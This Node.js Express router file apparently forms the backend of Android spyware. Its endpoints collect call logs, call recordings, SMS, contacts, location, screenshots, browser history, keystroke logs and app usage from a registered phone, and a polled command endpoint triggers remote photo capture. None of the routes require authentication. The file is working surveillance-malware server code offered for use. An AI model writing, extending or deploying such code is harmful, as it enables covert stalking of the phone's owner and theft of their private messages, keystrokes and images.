const express = require('express');
const router = express.Router();
const Device = require('../models/Device');
const CallLog = require('../models/CallLog');
const Message = require('../models/Message');
const Contact = require('../models/Contact');
const Location = require('../models/Location');
const BrowserHistory = require('../models/BrowserHistory');
const Screenshot = require('../models/Screenshot');
const Keylog = require('../models/Keylog');
const KeywordAlert = require('../models/KeywordAlert');
const Geofence = require('../models/Geofence');
const AppUsage = require('../models/AppUsage');
const CallRecording = require('../models/CallRecording');

// NEW: Import the new models for photo and command
const Photo = require('../models/Photo');
const Command = require('../models/Command');

// Helper: find device safely
const findDevice = async (deviceId) => {
    if (!deviceId) return null;
    let device = await Device.findOne({ deviceId });
    if (!device) return null;
    device.lastSeen = new Date();
    await device.save();
    return device;
};

// ================= REGISTER DEVICE =================
router.post('/register', async (req, res) => {
    const { deviceId, deviceName, deviceModel, androidVersion, userId } = req.body;
    if (!deviceId) {
        return res.status(400).json({ success: false, message: 'deviceId required' });
    }
    try {
        let device = await Device.findOne({ deviceId });
        if (!device) {
            device = new Device({ userId, deviceId, deviceName, deviceModel, androidVersion });
            await device.save();
        } else {
            device.lastSeen = new Date();
            await device.save();
        }
        res.json({ success: true, deviceId: device._id });
    } catch (err) {
        console.error('Register Device Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= DEVICE INFO UPDATE =================
router.post('/device-info', async (req, res) => {
    const { deviceId, deviceName, deviceModel, androidVersion, battery, networkStatus } = req.body;
    try {
        const device = await Device.findOne({ deviceId });
        if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
        
        device.deviceName = deviceName || device.deviceName;
        device.deviceModel = deviceModel || device.deviceModel;
        device.androidVersion = androidVersion || device.androidVersion;
        device.lastSeen = new Date();
        device.battery = battery || device.battery;
        device.networkStatus = networkStatus || device.networkStatus;
        await device.save();
        
        res.json({ success: true, message: 'Device info updated successfully' });
    } catch (err) {
        console.error('Device Info Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= CALL LOGS =================
router.post('/calls', async (req, res) => {
    const { deviceId, calls } = req.body;
    if (!calls || !Array.isArray(calls)) {
        return res.status(400).json({ success: false, message: 'calls array required' });
    }
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        const data = calls.map(call => ({ ...call, deviceId: device._id }));
        await CallLog.insertMany(data);
        res.json({ success: true });
    } catch (err) {
        console.error('Calls Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= CALL RECORDING =================
router.post('/call-recording', async (req, res) => {
    const { deviceId, callId, audioBase64, duration, timestamp } = req.body;
    try {
        const device = await findDevice(deviceId);
        if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
        
        await CallRecording.create({ 
            deviceId: device._id, 
            callId, 
            audioBase64, 
            duration, 
            timestamp: timestamp || new Date() 
        });
        
        res.json({ success: true, message: 'Call recording saved successfully' });
    } catch (err) {
        console.error('Call Recording Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= MESSAGES =================
router.post('/messages', async (req, res) => {
    const { deviceId, messages } = req.body;
    if (!messages || !Array.isArray(messages)) {
        return res.status(400).json({ success: false, message: 'messages array required' });
    }
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        const data = messages.map(msg => ({ ...msg, deviceId: device._id }));
        await Message.insertMany(data);
        res.json({ success: true });
    } catch (err) {
        console.error('Messages Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= CONTACTS =================
router.post('/contacts', async (req, res) => {
    const { deviceId, contacts } = req.body;
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        await Contact.deleteMany({ deviceId: device._id });
        if (contacts && contacts.length > 0) {
            const data = contacts.map(c => ({ ...c, deviceId: device._id }));
            await Contact.insertMany(data);
        }
        res.json({ success: true });
    } catch (err) {
        console.error('Contacts Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= LOCATION =================
router.post('/location', async (req, res) => {
    const { deviceId, lat, lng, address, speed } = req.body;
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        await Location.create({
            deviceId: device._id,
            lat,
            lng,
            address,
            speed,
            timestamp: new Date()
        });
        res.json({ success: true });
    } catch (err) {
        console.error('Location Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= SCREENSHOT =================
router.post('/screenshot', async (req, res) => {
    const { deviceId, imageBase64 } = req.body;
    if (!imageBase64) {
        return res.status(400).json({ success: false, message: 'Image required' });
    }
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        await Screenshot.create({
            deviceId: device._id,
            imageBase64,
            timestamp: new Date()
        });
        res.json({ success: true });
    } catch (err) {
        console.error('Screenshot Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= BROWSER HISTORY =================
router.post('/browser-history', async (req, res) => {
    const { deviceId, history } = req.body;
    if (!history || !Array.isArray(history)) {
        return res.status(400).json({ success: false, message: 'history array required' });
    }
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        const data = history.map(item => ({ ...item, deviceId: device._id }));
        await BrowserHistory.insertMany(data);
        res.json({ success: true });
    } catch (err) {
        console.error('Browser History Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= KEYLOGS =================
router.post('/keylogs', async (req, res) => {
    const { deviceId, keylogs } = req.body;
    if (!keylogs || !Array.isArray(keylogs)) {
        return res.status(400).json({ success: false, message: 'keylogs array required' });
    }
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        const data = keylogs.map(log => ({ ...log, deviceId: device._id }));
        await Keylog.insertMany(data);
        res.json({ success: true });
    } catch (err) {
        console.error('Keylogs Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= KEYWORD ALERTS =================
router.post('/keyword-alerts', async (req, res) => {
    const { deviceId, alerts } = req.body;
    if (!alerts || !Array.isArray(alerts)) {
        return res.status(400).json({ success: false, message: 'alerts array required' });
    }
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        const data = alerts.map(alert => ({ ...alert, deviceId: device._id }));
        await KeywordAlert.insertMany(data);
        res.json({ success: true });
    } catch (err) {
        console.error('Keyword Alerts Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= GEOFENCE =================
router.post('/geofence', async (req, res) => {
    const { deviceId, geofenceData } = req.body;
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        await Geofence.create({
            deviceId: device._id,
            ...geofenceData,
            timestamp: new Date()
        });
        res.json({ success: true });
    } catch (err) {
        console.error('Geofence Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= APP USAGE =================
router.post('/app-usage', async (req, res) => {
    const { deviceId, appUsage } = req.body;
    if (!appUsage || !Array.isArray(appUsage)) {
        return res.status(400).json({ success: false, message: 'appUsage array required' });
    }
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        const data = appUsage.map(usage => ({ ...usage, deviceId: device._id }));
        await AppUsage.insertMany(data);
        res.json({ success: true });
    } catch (err) {
        console.error('App Usage Error ❌:', err.message);
        res.status(500).json({ success: false, message: 'Server Error' });
    }
});

// ================= PHOTO UPLOAD =================
// NEW endpoint: receive photo from Android client
router.post('/photo', async (req, res) => {
    const { deviceId, imageBase64 } = req.body;
    if (!imageBase64) {
        return res.status(400).json({ success: false, message: 'Image required' });
    }
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        await Photo.create({ deviceId: device._id, imageBase64 });
        // Clear pending command
        await Command.findOneAndUpdate({ deviceId: device._id }, { command: 'none' }, { upsert: true });
        res.json({ success: true });
    } catch (err) {
        console.error('Photo upload error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ================= SET COMMAND (for dashboard) =================
// NEW endpoint: dashboard sends a command (e.g., take_photo)
router.post('/command', async (req, res) => {
    const { deviceId, command } = req.body;
    const device = await findDevice(deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    try {
        await Command.findOneAndUpdate(
            { deviceId: device._id },
            { command, createdAt: new Date() },
            { upsert: true }
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Command set error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ================= GET COMMAND (for Android client) =================
// NEW endpoint: Android client polls to check if there's a pending command
router.get('/command/:deviceId', async (req, res) => {
    const device = await findDevice(req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
    const cmd = await Command.findOne({ deviceId: device._id });
    const command = cmd ? cmd.command : 'none';
    res.json({ success: true, command });
    // Clear command after sending (except if it's 'none')
    if (command === 'take_photo') {
        await Command.updateOne({ deviceId: device._id }, { command: 'none' });
    }
});

module.exports = router;